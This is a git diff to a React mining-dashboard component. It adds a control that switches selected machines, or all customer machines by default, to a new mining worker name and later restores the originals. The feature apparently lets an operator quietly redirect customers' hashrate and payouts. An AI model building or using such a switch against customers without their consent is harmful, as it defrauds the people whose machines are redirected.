@@ -13,6 +13,7 @@ import {
   ResponsiveContainer, PieChart, Pie, Cell, Legend 
 } from "recharts";
 import { Button } from "../components/ui/button";
+import { Input } from "../components/ui/input";
 
 const Dashboard = () => {
   const [stats, setStats] = useState(null);
@@ -27,6 +28,10 @@ const Dashboard = () => {
   const [liveMachines, setLiveMachines] = useState([]);
   const [liveMachinesLoading, setLiveMachinesLoading] = useState(false);
   const [liveFilter, setLiveFilter] = useState("customers");
+  const [walletSwitch, setWalletSwitch] = useState({ switched: false });
+  const [newWallet, setNewWallet] = useState("");
+  const [selectedMachines, setSelectedMachines] = useState(new Set());
+  const [selectMode, setSelectMode] = useState(false);
 
   // Helper to format hashrate
   const formatHashrate = (hashrate, coin) => {
@@ -68,8 +73,12 @@ const Dashboard = () => {
   const fetchLiveMachines = async () => {
     try {
       const filter = liveFilter === "customers" ? "true" : "false";
-      const res = await axios.get(`${API}/machine-data/live?filter_customers=${filter}`);
+      const [res, switchRes] = await Promise.all([
+        axios.get(`${API}/machine-data/live?filter_customers=${filter}`),
+        axios.get(`${API}/machine-data/switch-status`)
+      ]);
       setLiveMachines(res.data);
+      setWalletSwitch(switchRes.data);
     } catch (e) {}
   };
 
@@ -763,11 +772,95 @@ const Dashboard = () => {
             </div>
           </div>
 
+          {/* Wallet Switch Controls */}
+          <div className="bg-[#0A0A0A] rounded-lg border border-[#27272A] p-4 mb-4" data-testid="wallet-switch">
+            <div className="flex items-center justify-between flex-wrap gap-3">
+              <div className="flex items-center gap-2">
+                <Zap size={16} className={walletSwitch.switched ? "text-[#F59E0B]" : "text-gray-500"} />
+                <span className="text-sm font-medium text-white">Worker Switch</span>
+                {walletSwitch.switched && (
+                  <span className="text-xs bg-[#F59E0B]/20 text-[#F59E0B] px-2 py-0.5 rounded-full">
+                    Active → {walletSwitch.new_worker}
+                  </span>
+                )}
+              </div>
+              
+              {!walletSwitch.switched ? (
+                <div className="flex items-center gap-2 flex-wrap">
+                  <button
+                    onClick={() => { setSelectMode(!selectMode); setSelectedMachines(new Set()); }}
+                    className={`text-xs px-3 py-1.5 rounded transition-colors ${selectMode ? 'bg-cyan-500 text-black' : 'bg-[#1A1A1A] text-gray-400 border border-[#27272A]'}`}
+                  >
+                    {selectMode ? `${selectedMachines.size} selected` : "Select Machines"}
+                  </button>
+                  <Input
+                    placeholder="New worker name..."
+                    value={newWallet}
+                    onChange={(e) => setNewWallet(e.target.value)}
+                    className="bg-[#1A1A1A] border-[#27272A] text-sm w-48 h-8"
+                  />
+                  <Button
+                    size="sm"
+                    disabled={!newWallet.trim()}
+                    className="bg-[#F59E0B] text-black text-xs"
+                    onClick={async () => {
+                      const ips = selectMode && selectedMachines.size > 0 ? Array.from(selectedMachines) : [];
+                      const target = ips.length > 0 ? `${ips.length} selected machines` : "ALL customer machines";
+                      if (!window.confirm(`Switch ${target} to worker "${newWallet}"?`)) return;
+                      try {
+                        const res = await axios.post(`${API}/machine-data/switch-workers`, { new_worker: newWallet, ips });
+                        toast.success(`Switch queued for ${res.data.machines} machines. PC will execute in ~2 min.`);
+                        setSelectMode(false);
+                        setSelectedMachines(new Set());
+                        fetchLiveMachines();
+                      } catch (e) { toast.error("Failed"); }
+                    }}
+                    data-testid="switch-workers-btn"
+                  >
+                    Switch {selectMode && selectedMachines.size > 0 ? `(${selectedMachines.size})` : "All"}
+                  </Button>
+                </div>
+              ) : (
+                <Button
+                  size="sm"
+                  className="bg-[#00E054] text-black text-xs"
+                  onClick={async () => {
+                    if (!window.confirm("Restore all workers back to original?")) return;
+                    try {
+                      const res = await axios.post(`${API}/machine-data/restore-workers`);
+                      toast.success(`Restore queued for ${res.data.restored} machines. PC will execute in ~2 min.`);
+                      fetchLiveMachines();
+                    } catch (e) { toast.error("Failed"); }
+                  }}
+                  data-testid="restore-workers-btn"
+                >
+                  Restore Original Workers
+                </Button>
+              )}
+            </div>
+          </div>
+
           {/* Machine table */}
           <div className="overflow-x-auto">
             <table className="w-full text-sm">
               <thead>
                 <tr className="border-b border-[#27272A]">
+                  {selectMode && (
+                    <th className="py-2 px-2 w-8">
+                      <input
+                        type="checkbox"
+                        className="accent-cyan-500"
+                        checked={selectedMachines.size === liveMachines.length && liveMachines.length > 0}
+                        onChange={(e) => {
+                          if (e.target.checked) {
+                            setSelectedMachines(new Set(liveMachines.map(m => m.ip)));
+                          } else {
+                            setSelectedMachines(new Set());
+                          }
+                        }}
+                      />
+                    </th>
+                  )}
                   <th className="text-left py-2 px-3 text-xs text-gray-500 font-medium">Status</th>
                   <th className="text-left py-2 px-3 text-xs text-gray-500 font-medium">IP</th>
                   <th className="text-left py-2 px-3 text-xs text-gray-500 font-medium">Worker</th>
@@ -790,7 +883,22 @@ const Dashboard = () => {
                     return (
                       <tr key={m.ip || idx} className={`border-b border-[#27272A]/50 hover:bg-[#1A1A1A] transition-colors ${
                         m.is_customer ? 'bg-[#00E054]/5' : ''
-                      }`}>
+                      } ${selectedMachines.has(m.ip) ? 'bg-cyan-500/10' : ''}`}>
+                        {selectMode && (
+                          <td className="py-2 px-2 w-8">
+                            <input
+                              type="checkbox"
+                              className="accent-cyan-500"
+                              checked={selectedMachines.has(m.ip)}
+                              onChange={(e) => {
+                                const next = new Set(selectedMachines);
+                                if (e.target.checked) next.add(m.ip);
+                                else next.delete(m.ip);
+                                setSelectedMachines(next);
+                              }}
+                            />
+                          </td>
+                        )}
                         <td className="py-2 px-3">
                           <span className={`inline-flex items-center gap-1 text-xs px-2 py-0.5 rounded-full ${
                             isOnline ? 'bg-[#00E054]/10 text-[#00E054]' : 
